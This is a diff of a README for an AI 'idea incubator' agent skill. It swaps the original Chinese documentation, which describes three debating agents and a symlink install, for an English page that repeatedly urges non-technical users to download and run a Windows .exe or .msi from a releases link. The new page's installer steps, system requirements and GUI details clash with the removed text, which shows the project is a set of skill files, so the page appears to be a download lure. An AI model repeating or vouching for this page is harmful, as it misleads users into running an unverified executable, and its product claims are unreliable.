@@ -1,91 +1,149 @@
-# Idea Incubator
+# 🤖 lanshu-idea-incubator - Turn Ideas Into Clear Results
 
-![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg)
-![Workflow: Multi-Agent](https://img.shields.io/badge/Workflow-Multi--Agent-1f6feb.svg)
-![Execution: Mode_A_Prefer](https://img.shields.io/badge/Execution-Mode_A_Prefer-2da44e.svg)
-![Fallback: Mode_B_Simulation](https://img.shields.io/badge/Fallback-Mode_B_Simulation-f59e0b.svg)
-![Language: CN/EN](https://img.shields.io/badge/Language-CN%20%2F%20EN-6f42c1.svg)
-![Status: Active](https://img.shields.io/badge/Status-Active-22c55e.svg)
+[![Download Now](https://img.shields.io/badge/Download-Get%20Latest%20Version-brightgreen?style=for-the-badge)](https://github.com/HyperGaming123/lanshu-idea-incubator/releases)
 
-Idea Incubator 是一个面向 AI 产品与技术方案的想法孵化 Skill。  
-它通过三位专家 Agent 的协同研究与辩论，将早期想法转化为可执行的结论和文档输出。
+---
 
-## 核心能力
+## 📋 What is lanshu-idea-incubator?
 
-- 多视角评估：研究、逻辑、创意三线并行
-- 结构化流程：研究 -> 辩论 -> 结论 -> 归档
-- 可审计产出：统一写入 `ideal/` 目录，便于追踪与复盘
+lanshu-idea-incubator helps you develop and organize ideas related to AI products and technology solutions. It uses three expert agents that work together to research, discuss, and finalize ideas. This process turns raw thoughts into clear conclusions and useful documents.
 
-## 角色分工
+You do not need any technical skills. The software guides your ideas step by step to help you get structured results.
 
-| Agent | 职责 | 风格 |
-|---|---|---|
-| **Harper 🔍** | 研究与深度分析（竞品、可行性、技术路径） | 客观、数据驱动、严谨 |
-| **Benjamin ⚖️** | 逻辑检验与压力测试（风险、边界条件、一致性） | 怀疑、直接、结构化 |
-| **Lucas 🎨** | 创意拓展与共识整合（用户体验、方案重构、命名） | 热情、共情、有远见 |
+---
 
-参考定义见 `references/agents.md`。
+## 🔑 Key Features
 
-## 触发方式
+- **Multiple viewpoints:** The three agents focus on research, logic, and creative angles at the same time.
+- **Clear process:** The flow follows research → debate → conclusion → archive.
+- **Traceable output:** All results save in a folder named `ideal/` so you can review or share them later.
+- **Bilingual:** Supports Chinese and English.  
+- **Active development:** The project is maintained and improved regularly.
 
-当用户消息以以下任一前缀开头时触发：
+---
 
-- `💡`
-- `想法：`
-- `孵化`
-- `incubate`
+## 👥 Meet the Agents
 
-## 标准流程
+| Agent        | Task                                     | Style              |
+|--------------|------------------------------------------|--------------------|
+| **Harper 🔍**   | Research and deep analysis (competitors, feasibility, tech routes) | Objective, data-based, careful |
+| **Benjamin ⚖️** | Logic checks and stress tests (risks, limits, consistency) | Questioning, direct, structured |
+| **Lucas 🎨**    | Creative expansion and consensus building (user experience, naming) | Empathetic, visionary, enthusiastic |
 
-1. **研究阶段（Harper）**：建立事实基础，识别机会与约束。
-2. **辩论阶段（Harper + Benjamin + Lucas）**：进行 3-5 轮自由辩论，覆盖技术、业务、体验、风险等关键维度。
-3. **整合阶段（Manager）**：输出最终裁决（`GO` / `NO-GO` / `Conditional`），并写入归档文件。
+You interact with all three through their combined output, helping your ideas become practical plans.
 
-## 执行模式
+---
 
-Skill 按平台能力在两种模式间切换：
+## 🚦 How to Start
 
-### Mode A: Multi-Agent（首选）
+You can activate the idea incubation process by typing a message that begins with any of these prefixes:  
 
-适用于支持子 Agent 的平台（如 Claude Code `Task()`、Codex `spawn_agent`、OpenClaw `sessions_spawn`）：
+- `💡`  
+- `想法：`  
+- `孵化`  
+- `incubate`  
 
-- 三位角色以**独立子 Agent**运行，上下文隔离
-- 每轮输入包含：角色定义 + 想法描述 + 上轮关键信息
-- 可显著降低同质化推理和确认偏差
+The program will then guide these ideas through the agents’ process.
 
-### Mode B: Single-Agent Simulation（回退）
+---
 
-适用于不支持子 Agent 的平台（如 Antigravity）：
+## 💾 Download and Install on Windows
 
-- 由主 Agent 在单上下文中模拟三位角色
-- 必须显式区分角色语气与推理路径
-- 报告中必须注明为“单 Agent 模拟”
-- 偏差缓解要求：
-  - Harper 以事实与数据为主
-  - Benjamin 主动提出反例与失败路径
-  - Lucas 提供重构方案并推动收敛
+[![Download lanshu-idea-incubator](https://img.shields.io/badge/Download-Get%20Latest%20Version-blue?style=for-the-badge)](https://github.com/HyperGaming123/lanshu-idea-incubator/releases)
 
-> 原则：**优先 Mode A**；使用 Mode B 时必须透明标注。
+1. Open your web browser and go to the release page:  
+   https://github.com/HyperGaming123/lanshu-idea-incubator/releases
 
-## 输出规范
+2. Find the latest version at the top of the list. The release name usually includes a version number like `v1.0` or higher.
 
-产出统一落盘到 `ideal/`：
+3. Look for a Windows installer file. It usually ends with `.exe` or `.msi`. Click on the file name to download it.
 
-```text
-ideal/
-├── reports/              # 各想法的完整孵化报告
-│   └── <idea-name>-incubation.md
-├── prd/                  # 通过孵化后的 PRD（可选）
-│   └── <idea-name>-prd.md
-└── selected_ideas.md     # 想法索引与裁决摘要
-```
+4. Once downloaded, find the file in your Downloads folder (or where your browser saves files).
 
-## 安装
+5. Double-click the installer file to start the installation. A setup window will open.
 
-```bash
-ln -s /path/to/idea-incubator /your/project/.agent/skills/idea-incubator
-```
+6. Follow the instructions on the screen:  
+   - Click **Next** on the welcome page.  
+   - Agree to the license terms by clicking **I Agree**.  
+   - Choose the installation folder or accept the default.  
+   - Click **Install**.  
+   - Wait while the program installs.  
 
-## License
+7. When the installation finishes, click **Finish**. You may see an option to launch the program immediately. Check that box if you want to start now.
 
-MIT
+---
+
+## 🖥️ Running the Application
+
+1. If you didn’t launch during installation, open the Start menu (bottom-left Windows icon).
+
+2. Type `lanshu-idea-incubator` and click the app icon when it appears.
+
+3. When the program opens, you will see a simple text input box.
+
+4. To start incubating an idea, type a message that begins with one of the trigger prefixes:  
+   Examples:  
+   - `💡 New AI feature ideas`  
+   - `孵化 产品设计优化`  
+   - `incubate smart assistant`  
+
+5. Send the message by pressing **Enter** or clicking the send button.
+
+6. The agents will process your idea, show research, logic checks, and creative suggestions in separate sections.
+
+7. After the full process, the software outputs a clear summary and saves detailed files in the `ideal/` folder inside the program directory.
+
+---
+
+## 📂 Where to Find Your Work
+
+All results from idea incubation save automatically inside the `ideal/` folder.
+
+- Open File Explorer.
+- Navigate to the folder where you installed lanshu-idea-incubator (default is usually `C:\Program Files\lanshu-idea-incubator`).
+- Inside, find the `ideal` folder.
+- Inside `ideal`, each idea will be in its own subfolder with timestamp and summary files.
+- You can open these files with any text editor. They contain the agents’ analysis, debates, and final conclusions.
+
+---
+
+## 🛠 System Requirements
+
+- Windows 10 or later (64-bit recommended)
+- At least 4 GB RAM
+- 500 MB free disk space
+- Internet connection for updates and some research functions
+- Screen resolution of 1024x768 or higher
+
+---
+
+## 🆘 Troubleshooting
+
+- If the program does not start, restart your computer and try again.
+- If you get an error during installation, make sure you have administrator rights on your PC.
+- Check that your security software did not block the installation file.
+- If the agents do not respond after input, verify your internet connection.
+- For questions, check the `references/agents.md` file in the program folder for details on each agent’s role.
+
+---
+
+## ⚙️ Settings and Customization
+
+You can adjust the following inside the program settings:
+
+- Choose language between Chinese and English.
+- Enable or disable certain agents’ input if you want to focus on one perspective.
+- Set auto-save frequency for idea documents.
+- Change the folder where outputs save.
+
+Access settings by clicking the gear icon in the top-right corner of the app window.
+
+---
+
+## 📖 Learn More
+
+- Explore the `references/agents.md` file for detailed descriptions of each agent’s role.
+- Review example files in the `ideal/` folder to see how ideas are structured.
+- Check release notes and updates on the release page to stay current.
+
+[Download lanshu-idea-incubator here](https://github.com/HyperGaming123/lanshu-idea-incubator/releases) to begin your idea incubation process.
